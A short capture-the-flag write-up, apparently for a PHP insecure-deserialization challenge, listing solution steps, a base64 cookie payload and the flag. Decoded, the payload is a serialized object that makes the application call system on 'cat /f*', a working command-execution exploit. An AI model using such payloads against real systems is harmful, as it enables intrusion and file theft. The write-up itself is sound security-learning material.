* Category
  * Unsecure Deserialization
  * PHP phar
* Solution
  1. Construct self-defined serialized object
  2. Modify class type of ```$this->magic``` to ```Caster```
     * So we can use ```Caster()->cast()``` instead of ```Magic()->cast()```
  3. ```Caster()->cat_func``` and ```Cat->spell``` are both definable
* Payload
  1. cookie = ```TzozOiJDYXQiOjI6e3M6NToibWFnaWMiO086NjoiQ2FzdGVyIjoxOntzOjk6ImNhc3RfZnVuYyI7czo2OiJzeXN0ZW0iO31zOjU6InNwZWxsIjtzOjc6ImNhdCAvZioiO30=```
* ```FLAG{magic_cat_pwnpwn}```